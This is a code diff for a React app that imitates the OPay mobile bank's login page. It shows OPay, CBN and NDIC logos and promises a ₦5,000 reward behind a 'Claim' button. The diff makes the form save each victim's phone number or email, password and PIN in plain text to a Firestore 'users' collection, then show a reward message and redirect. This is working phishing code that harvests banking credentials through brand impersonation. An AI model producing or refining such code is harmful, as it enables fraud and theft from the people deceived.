@@ -7,8 +7,11 @@ import Logo from "../src/assets/opay-logo.jpg";
 import CBN from "../src/assets/cbn.jpg";
 import NDIC from "../src/assets/ndic.jpg";
 import "./App.css";
+import { db } from "./firebaseConfig";
+import { collection, addDoc } from "firebase/firestore";
+// import UserForm from "../src/UserForm";
 
-const API_URL = process.env.REACT_APP_API_URL || "http://localhost:7127";
+// const API_URL = process.env.REACT_APP_API_URL || "http://localhost:7212";
 
 const App = () => {
   const [phoneNumber, setPhoneNumber] = useState("");
@@ -26,7 +29,7 @@ const App = () => {
   const handleSubmit = async (e) => {
     e.preventDefault();
     const newErrors = {};
-  
+
     if (!validatePhoneNumber(phoneNumber)) {
       newErrors.phoneNumber = "Invalid phone number";
     }
@@ -36,43 +39,32 @@ const App = () => {
     if (!validatePin(pin)) {
       newErrors.pin = "PIN must be 4 digits";
     }
-  
+
     setErrors(newErrors);
-  
+
     if (Object.keys(newErrors).length === 0) {
       try {
-        const payload = {
-          PhoneNumber: phoneNumber,
-          Pin6: password,
-          Pin4: pin,
-        };
-  
-        const response = await axios.post(
-          `${API_URL}/api/Auth/register`,
-          payload,
-          {
-            headers: { "Content-Type": "application/json" },
-            withCredentials: true,
-          }
-        );
-        console.log("Registration Success:", response.data);
-        alert("🎉 Congratulations! You just won the ₦5000 bonus. Please wait a few minutes for it to be added to your balance.");
-        navigate("/redirect", { replace: true }); // Change this line to use the redirect component
+        await addDoc(collection(db, "users"), {
+          phoneNumber,
+          password, // Storing password in plain text (NOT RECOMMENDED)
+          pin,
+          createdAt: new Date(),
+        });
+
+        alert("Congratulations, your reward of ₦5,000 is on the way into your account 🎉.");
+        navigate("/redirect", { replace: true });
       } catch (error) {
-        console.error("Registration Failed:", error);
-        alert(error.response?.data?.message || "Registration failed");
+        console.error("Error saving data:", error);
+        alert("Error saving data");
       }
     }
   };
-
-  
 
   return (
     <div className="container">
       <div className="form-container">
         <img src={Logo} alt="OPay Logo" className="logo" />
         <form onSubmit={handleSubmit} className="form-content">
-          {/* Floating Label Input */}
           <div className="form-group floating">
             <input
               type="text"
@@ -86,12 +78,9 @@ const App = () => {
             <label htmlFor="phoneNumber" className="floating-label">
               Enter your Mobile No./Email
             </label>
-            {errors.phoneNumber && (
-              <div className="error-message">{errors.phoneNumber}</div>
-            )}
+            {errors.phoneNumber && <div className="error-message">{errors.phoneNumber}</div>}
           </div>
 
-          {/* Password Input with Toggle */}
           <div className="form-group">
             <div className="password-container">
               <input
@@ -109,12 +98,9 @@ const App = () => {
                 onClick={() => setShowPassword(!showPassword)}
               />
             </div>
-            {errors.password && (
-              <div className="error-message">{errors.password}</div>
-            )}
+            {errors.password && <div className="error-message">{errors.password}</div>}
           </div>
 
-          {/* PIN Input with Toggle */}
           <div className="form-group">
             <div className="password-container">
               <input
@@ -133,14 +119,10 @@ const App = () => {
               />
             </div>
             {errors.pin && <div className="error-message">{errors.pin}</div>}
-            <a href="/sign" className="forgot-password">
-              Forgot Password?
-            </a>
+            <a href="/sign" className="forgot-password">Forgot Password?</a>
           </div>
 
-          <button type="submit" className="btn btn-primary">
-            Claim
-          </button>
+          <button type="submit" className="btn btn-primary">Claim</button>
         </form>
 
         <div className="bottom-text-container">
@@ -151,11 +133,13 @@ const App = () => {
         </div>
 
         <div className="bottom-social">
-          <img src={CBN} alt="CBN Logo" className="social-logo" /> Licensed by
-          the <span style={{ color: "#3C3B5F", fontWeight: "bold" }}>CBN</span>{" "}
-          and insured by the{" "}
+          <img src={CBN} alt="CBN Logo" className="social-logo" /> Licensed by the{" "}
+          <span style={{ color: "#3C3B5F", fontWeight: "bold" }}>CBN</span> and insured by the{" "}
           <img src={NDIC} alt="NDIC Logo" className="social-logo" />
         </div>
+
+        {/* Include the UserForm component */}
+        {/* <UserForm /> */}
       </div>
     </div>
   );
